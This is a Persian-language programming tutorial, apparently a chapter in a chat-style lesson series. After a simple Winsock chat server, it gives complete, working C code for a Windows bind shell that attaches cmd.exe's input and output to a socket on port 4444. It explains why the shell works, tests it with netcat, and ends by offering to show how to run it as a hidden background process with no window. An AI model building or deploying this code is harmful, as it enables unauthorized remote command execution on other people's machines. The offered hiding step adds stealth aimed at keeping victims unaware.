

```c
#include <WinSock2.h>
#include <ws2tcpip.h> 
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    SOCKET serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    int clientaddr_len = sizeof(clientAddr);

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
        printf("WSAStartup failed. Error: %d\n", WSAGetLastError());
        return 1;
    }

    serverSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSocket == INVALID_SOCKET) {
        printf("Socket creation failed.\n");
        WSACleanup();
        return 1;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(4444); 

    if (bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        printf("Bind failed. Error: %d\n", WSAGetLastError());
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    listen(serverSocket, 3);
    printf("[*] Waiting for incoming connections on port 4444...\n");

    clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientaddr_len);
    if (clientSocket == INVALID_SOCKET) {
        printf("Accept failed.\n");
        closesocket(serverSocket);
        WSACleanup();
        return 1;
    }

    printf("[+] Connection accepted!\n");

    while (1) {
        char sendBuffer[1024];
        char recvBuffer[1024] = { 0 };
        printf("Server (You): ");
        if (fgets(sendBuffer, sizeof(sendBuffer), stdin) == NULL) break; 

        send(clientSocket, sendBuffer, (int)strlen(sendBuffer), 0);

        int bytesReceived = recv(clientSocket, recvBuffer, sizeof(recvBuffer) - 1, 0);

        if (bytesReceived > 0) {
            recvBuffer[bytesReceived] = '\0';
            printf("Client: %s\n", recvBuffer);
        }
        else if (bytesReceived == 0) {
            printf("Client disconnected.\n");
            break;
        }
        else {
            printf("recv failed: %d\n", WSAGetLastError());
            break;
        }
    }

    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();

    return 0;
}
```



این بخش از آموزش ما وارد مباحث **سیستمی (Systems Programming)** می‌شود. برای اینکه خروجی یک پردازش (مثل `cmd.exe`) را به یک سوکت منتقل کنیم، باید از مفهومی به نام **Redirection** (تغییر مسیر) استفاده کنیم.

در ویندوز، هر پردازش به صورت پیش‌فرض سه هندل (Handle) دارد:
1.  **STDIN**: ورودی استاندارد (کیبورد)
2.  **STDOUT**: خروجی استاندارد (مانیتور)
3.  **STDERR**: خطاهای استاندارد

ما می‌خواهیم هر سه مورد را به `SOCKET` متصل کنیم.

---

### فصل نهم: ایجاد Bind Shell (اتصال شل به سوکت)

برای این کار از ساختار `STARTUPINFO` در ویندوز استفاده می‌کنیم. این ساختار به ما اجازه می‌دهد تعیین کنیم که پردازش جدید (در اینجا `cmd.exe`) ورودی و خروجی‌اش را از کجا بگیرد.

#### فرمول تئوری کار:
$$Handle_{Socket} \rightarrow (STDIN, STDOUT, STDERR)$$

زمانی که کلاینت به سرور وصل می‌شود، ما یک پروسه `cmd.exe` می‌سازیم و به آن می‌گوییم: «به جای نمایش خروجی در صفحه سیاه کنسول، آن را درون سوکت بفرست».

---

### پیاده‌سازی کد:

```c
#include <WinSock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsa;
    SOCKET serverSocket, clientSocket;
    struct sockaddr_in serverAddr, clientAddr;
    int clientAddrLen = sizeof(clientAddr);

    // 1. Initialize Winsock
    WSAStartup(MAKEWORD(2, 2), &wsa);

    // 2. Create Socket
    serverSocket = socket(AF_INET, SOCK_STREAM, 0);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(4444);

    // 3. Bind & Listen
    bind(serverSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr));
    listen(serverSocket, 1);

    printf("[*] Shell Server is listening on port 4444...\n");

    // 4. Accept Connection
    clientSocket = accept(serverSocket, (struct sockaddr*)&clientAddr, &clientAddrLen);
    printf("[+] Connection established. Spawning Shell...\n");

    // --- بخش اصلی: اتصال شل به سوکت ---

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    // پاکسازی حافظه ساختارها
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // تنظیم پرچم برای استفاده از هندل‌های سفارشی
    si.dwFlags = STARTF_USESTDHANDLES;
    
    // ارجاع ورودی/خروجی/خطا به سوکت کلاینت
    si.hStdInput = (HANDLE)clientSocket;
    si.hStdOutput = (HANDLE)clientSocket;
    si.hStdError = (HANDLE)clientSocket;

    // 5. Create Process (cmd.exe)
    // کلاینت مستقیماً با CMD حرف می‌زند
    char cmdPath[] = "C:\\Windows\\System32\\cmd.exe";
    if (!CreateProcessA(NULL, cmdPath, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed. Error: %d\n", GetLastError());
    }

    // منتظر می‌مانیم تا پردازش تمام شود
    WaitForSingleObject(pi.hProcess, INFINITE);

    // بستن هندل‌ها
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(clientSocket);
    closesocket(serverSocket);
    WSACleanup();

    return 0;
}
```

---

### تحلیل فنی (نکات بسیار مهم):

1.  **`STARTF_USESTDHANDLES`**: این فلگ به سیستم‌عامل می‌گوید که ما می‌خواهیم هندل‌های استاندارد را دستی تنظیم کنیم.
2.  **Casting Socket to HANDLE**: در ویندوز، `SOCKET` از نظر ساختاری بسیار شبیه به `HANDLE` است، لذا می‌توانیم آن را مستقیماً به خروجی‌های `cmd` نسبت دهیم.
3.  **`CreateProcessA`**: آرگومان پنجم (`TRUE`) بسیار حیاتی است. این آرگومان یعنی هندل‌های والد (سرور ما) باید توسط فرزند (CMD) به ارث برده شوند (Inherit Handles). اگر این گزینه `FALSE` باشد، شل کار نخواهد کرد.

### تست کردن:
1.  کد را اجرا کنید.
2.  در یک سیستم دیگر (یا یک تب CMD دیگر) از ابزار Netcat استفاده کنید:
    `nc 127.0.0.1 4444`
3.  خواهید دید که به محض اتصال، اعلان `C:\Users\...>` برای کلاینت ظاهر می‌شود و او می‌تواند دستورات سیستم شما را اجرا کند.

---

### گام بعدی: مخفی‌سازی و بهینه‌سازی
در حال حاضر وقتی سرور اجرا می‌شود، یک پنجره کنسول سیاه باز می‌ماند. 
**آیا دوست داری یاد بگیری چطور برنامه را به صورت "Background Process" اجرا کنی که هیچ پنجره‌ای نداشته باشد؟** (مبحث مربوط به `WinMain` به جای `main`)



